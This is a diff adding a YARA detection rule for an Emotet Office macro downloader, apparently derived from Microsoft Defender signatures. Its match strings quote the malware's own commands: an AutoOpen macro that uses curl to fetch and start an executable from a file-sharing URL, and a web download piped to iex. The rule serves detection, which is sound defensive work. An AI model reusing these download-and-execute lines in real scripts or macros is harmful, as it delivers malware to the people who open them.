@@ -11827,3 +11827,26 @@ rule TrojanDownloader_O97M_Emotet_PSWA_2147898434_0
         (all of ($x*))
 }
 
+rule TrojanDownloader_O97M_Emotet_VRC_2147923970_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "TrojanDownloader:O97M/Emotet.VRC!MTB"
+        threat_id = "2147923970"
+        type = "TrojanDownloader"
+        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
+        family = "Emotet"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
+        threshold = "3"
+        strings_accuracy = "High"
+    strings:
+        $x_1_1 = "AutoOpen Macro" ascii //weight: 1
+        $x_1_2 = "Shell (\"cmd /c curl filetransfer.io/data-package/AuN8CiZP/download --output p.exe && start p.exe\")" ascii //weight: 1
+        $x_1_3 = "Shell (A & O & B & \"'https://onedrive.live.com/download?resid=59261C7E41B6478A%21215&authkey=!AILxsvzlZboP3io' -UseBasicParsing).Content | iex \")" ascii //weight: 1
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
